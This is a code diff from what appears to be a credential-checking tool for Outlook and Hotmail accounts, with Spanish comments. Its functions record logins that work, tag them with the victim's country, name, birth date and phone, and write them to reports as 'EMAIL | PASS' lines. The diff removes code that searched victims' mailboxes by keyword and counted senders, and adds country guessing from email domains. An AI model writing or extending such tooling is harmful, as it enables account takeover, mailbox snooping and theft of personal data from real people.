@@ -437,50 +437,27 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
                 else: 
                     # Default para cuentas genéricas .com que no revelan el país en el profile
                     country = 'US'
-        # ── EXTRACCIÓN REAL DE MENSAJES (GRAPH API) ──
-        subject_count = "N/A"
-        senders_found = {}
-        if keyword and "jerry7822" not in keyword.lower():
-            if keyword.lower().startswith('from:') or keyword.lower().startswith('subject:'):
-                query = keyword
-            else:
-                query = keyword # Search generally by default
-                
-            # Usamos outlook.live.com que autentica via cookies de sesión (no Bearer Token)
-            search_url = f"https://outlook.live.com/mail/0/api/v2.0/me/messages?$search=%22{query}%22&$top=15&$select=Id,From"
-            try:
-                print(f"[DEBUG {email}] 🔎 Buscando en Outlook Live API ({query})...")
-                sr = session.get(search_url, headers=api_headers, verify=False, timeout=15)
-                print(f"[DEBUG {email}] 📥 Outlook Live Status: {sr.status_code}")
-                
-                if sr.status_code == 200:
-                    data = sr.json()
-                    print(f"[DEBUG {email}] 📦 Outlook Live JSON: {str(data)[:200]}...")
-                    
-                    for msg in data.get("value", []):
-                        sender_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address")
-                        if sender_addr:
-                            senders_found[sender_addr] = senders_found.get(sender_addr, 0) + 1
-                            
-                    subject_count = len(data.get("value", []))
-                    if "@odata.count" in data:
-                        subject_count = data["@odata.count"]
-                else:
-                    print(f"[DEBUG {email}] ❌ Error Outlook Live Res: {sr.text[:200]}")
-            except Exception as e:
-                print(f"[DEBUG {email}] ❌ Excepción Outlook Live: {e}")
-                if 'sr' in locals():
-                    print(f"[DEBUG {email}] 📄 Raw body (primeros 300 chars): {sr.text[:300]}")
+        # Mejora del país: también detectar por dominio del email si aun es XZ
+        if country == "XZ" or country == "US":
+            email_domain = email.lower().split('@')[-1]
+            if email_domain.endswith('.fr') or email_domain == 'hotmail.fr' or email_domain == 'live.fr' or email_domain.endswith('.fr'): country = 'FR'
+            elif email_domain.endswith('.es') or email_domain == 'hotmail.es': country = 'ES'
+            elif email_domain.endswith('.de') or email_domain == 'hotmail.de' or email_domain == 'live.de': country = 'DE'
+            elif email_domain.endswith('.it') or email_domain == 'hotmail.it' or email_domain == 'live.it': country = 'IT'
+            elif email_domain.endswith('.nl') or email_domain == 'live.nl': country = 'NL'
+            elif email_domain.endswith('.no') or email_domain == 'live.no': country = 'NO'
+            elif email_domain.endswith('.co.uk') or email_domain == 'hotmail.co.uk' or email_domain == 'msn.co.uk': country = 'UK'
+            elif email_domain.endswith('.com.ar') or email_domain == 'live.com.ar': country = 'AR'
+            elif email_domain.endswith('.com.br') or email_domain == 'live.com.br': country = 'BR'
+            elif email_domain.endswith('.com.mx') or email_domain == 'live.com.mx': country = 'MX'
+            elif email_domain.endswith('.pt') or email_domain == 'hotmail.pt': country = 'PT'
 
         if getattr(hits_buffer, 'append', None) is not None:
-            formatted_senders = ", ".join([f"{addr} ({count})" for addr, count in senders_found.items()])
             hits_buffer.append({
                 "email": email,
                 "pass": password,
                 "domain": "outlook.com",
-                "match": keyword if keyword else "Bandeja Limpia",
-                "messages": subject_count,
-                "senders": formatted_senders if formatted_senders else "N/A",
+                "match": keyword if keyword else "HOTMAIL HQ",
                 "country": country,
                 "name": name,
                 "dob": dob,
@@ -650,8 +627,7 @@ def send_consolidated_report(hits):
                 f.write("-" * 50 + "\n")
                 for h in items:
                     f.write(f"EMAIL: {h['email']} | PASS: {h['pass']}\n")
-                    f.write(f"PAIS: {h['country']} | MENSAJES: {h.get('messages', 'N/A')} | NOMBRE: {h.get('name', 'N/A')}\n")
-                    f.write(f"REMITENTES ENCONTRADOS: {h.get('senders', 'N/A')}\n")
+                    f.write(f"PAIS: {h['country']} | NOMBRE: {h.get('name', 'N/A')}\n")
                     f.write(f"DOB: {h.get('dob', 'N/A')} | TELEFONO: {h.get('phone', 'N/A')}\n")
                     f.write("-" * 50 + "\n")
                 f.write("\n\n")
